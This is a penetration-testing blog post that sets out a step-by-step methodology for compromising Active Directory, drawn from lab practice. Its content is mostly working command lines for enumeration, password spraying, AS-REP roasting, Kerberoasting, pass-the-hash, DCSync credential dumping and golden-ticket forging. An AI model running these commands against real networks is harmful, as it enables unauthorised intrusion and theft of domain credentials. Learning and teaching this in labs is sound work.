---
layout: post
title: "Active Directory Attack Methodology: From Foothold to Domain Admin"
date: 2026-09-15 00:00:00 +0700
category: research
tags: [active-directory, methodology, kerberos, bloodhound, lateral-movement]
description: "A structured methodology for attacking Active Directory environments — from initial enumeration through privilege escalation to domain compromise."
---

## Introduction

Active Directory is the backbone of most enterprise Windows environments, and it remains one of the most targeted attack surfaces in penetration tests. This post outlines a structured methodology I use when attacking AD environments, compiled from lab practice on HTB Pro Labs (Offshore, RastaLabs) and CPTS coursework.

---

## Phase 1 — Reconnaissance & Enumeration

### External Recon (black-box start)

```bash
# DNS enumeration
dnsenum --dnsserver <dc-ip> --enum -p 0 -s 0 -o results.txt <domain>

# Zone transfer attempt
dig axfr @<dc-ip> <domain>

# Subdomain brute force
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### SMB NULL Sessions

```bash
netexec smb <target-range> --gen-relay-list relay_targets.txt
netexec smb <dc-ip> -u '' -p '' --shares
netexec smb <dc-ip> -u '' -p '' --users
```

### LDAP Anonymous Bind

```bash
ldapsearch -x -H ldap://<dc-ip> -b "DC=<domain>,DC=local" "(objectClass=user)" \
  sAMAccountName userPrincipalName memberOf
```

---

## Phase 2 — Initial Foothold

### AS-REP Roasting (no credentials required)

Targets accounts with Kerberos pre-authentication **disabled**:

```bash
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass \
  -dc-ip <dc-ip> -outputfile asrep_hashes.txt
```

Crack offline:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Password Spraying

```bash
# Use a single password to avoid lockouts — check lockout policy first!
netexec smb <dc-ip> -u users.txt -p 'Welcome2024!' --continue-on-success
```

> **Warning:** Always check the domain's account lockout policy (`net accounts /domain`) before spraying. A threshold of 3–5 attempts is common.

---

## Phase 3 — Lateral Movement

### Pass-the-Hash

```bash
impacket-psexec <domain>/<user>@<target> -hashes :<nt-hash>
# or
netexec smb <target> -u <user> -H <nt-hash> -x "whoami"
```

### Kerberoasting (with credentials)

```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> \
  -request -outputfile kerberoast_hashes.txt

hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### BloodHound Data Collection

```bash
# Remote collection
bloodhound-python -d <domain> -u <user> -p <pass> \
  -dc <dc-hostname> -c All --zip

# On-host (if you have a shell)
.\SharpHound.exe -c All --zipfilename bh_data.zip
```

Import into BloodHound and look for:
- **Shortest Paths to Domain Admins**
- **Kerberoastable Users**  
- **ASREPRoastable Users**
- **DCSync rights** (`GetChangesAll`)

---

## Phase 4 — Privilege Escalation to DA

### DCSync (if you have replication rights)

```bash
impacket-secretsdump <domain>/<user>:<pass>@<dc-ip> -just-dc-ntlm
```

This dumps all NTLM hashes from the domain controller — equivalent to pwning the domain.

### Pass-the-Ticket / Golden Ticket

```bash
# Dump krbtgt hash first (via DCSync)
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain-sid> \
  -domain <domain> -groups 512 Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <domain>/Administrator@<dc-hostname>
```

---

## Checklist

- [ ] LDAP / SMB null sessions
- [ ] AS-REP Roasting
- [ ] Password spraying (check lockout policy first)
- [ ] BloodHound collection & analysis
- [ ] Kerberoasting (with creds)
- [ ] ACL abuse (WriteDACL, GenericWrite, etc.)
- [ ] Pass-the-Hash / Pass-the-Ticket
- [ ] DCSync
- [ ] Golden / Silver tickets

---

## References

- [HackTricks — Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [SpecterOps BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Impacket](https://github.com/fortra/impacket)
